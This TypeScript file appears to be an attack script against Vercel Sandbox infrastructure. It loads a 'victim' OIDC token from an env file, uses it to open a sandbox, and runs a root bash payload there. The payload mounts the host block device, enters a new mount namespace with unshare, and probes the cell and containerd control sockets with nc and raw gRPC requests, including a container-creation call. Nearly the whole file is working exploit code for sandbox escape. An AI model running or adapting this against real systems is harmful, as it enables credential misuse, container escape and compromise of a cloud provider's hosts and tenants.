import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
mkdir -p /mnt/vda2
mount -t xfs /dev/vda /mnt/vda2 2>/dev/null
R=/mnt/vda2
echo "===== live vs disk: check socket inodes ====="
ls -la $R/run/cell/ $R/run/containerd/ 2>&1
echo "--- compare with host-visible sockets (ss) ---"
sudo ss -xlp 2>&1 | grep -E "cell.sock|containerd.sock|init.sock"
echo
echo "===== connect to cell.sock via mount ====="
for path in $R/run/cell/cell.sock $R/run/containerd/containerd.sock $R/run/containerd/containerd.sock.ttrpc; do
  echo "--- connect $path ---"
  for probe in "PING" "GET / HTTP/1.1\r\nHost: x\r\n\r\n" "\\x00\\x00\\x00\\x00"; do
    printf "$probe" | timeout 3 nc -U "$path" 2>&1 | head -3 | tr -d '\\0'
  done
done
echo
echo "===== gRPC introspection/health over cell.sock ====="
for svc in /grpc.health.v1.Health/Check /vercel.hive.celld.api.v1.Celld/Health /vercel.hive.cell.api.containers.v1.Containers/Create; do
  echo "--- $svc ---"
  printf 'POST %s HTTP/1.1\\r\\nHost: cell\\r\\nContent-Type: application/grpc\\r\\nTE: trailers\\r\\nContent-Length: 0\\r\\n\\r\\n' "$svc" | timeout 3 nc -U $R/run/cell/cell.sock 2>&1 | head -6 | tr -d '\\0'
done
echo
echo "===== containerd version via unix (grpc) ====="
printf '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' | timeout 3 nc -U $R/run/containerd/containerd.sock 2>&1 | head -c 200 | xxd | head -5
echo
echo "===== runc tasks on disk (live?) ====="
find $R/run/runc -maxdepth 4 2>/dev/null | head -20
find $R/run/cell/runc -maxdepth 4 2>/dev/null | head -20
echo "===== cell /proc visible? (host pid ns via disk proc) ====="
ls $R/proc 2>&1 | head
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore5.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore5.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 180_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });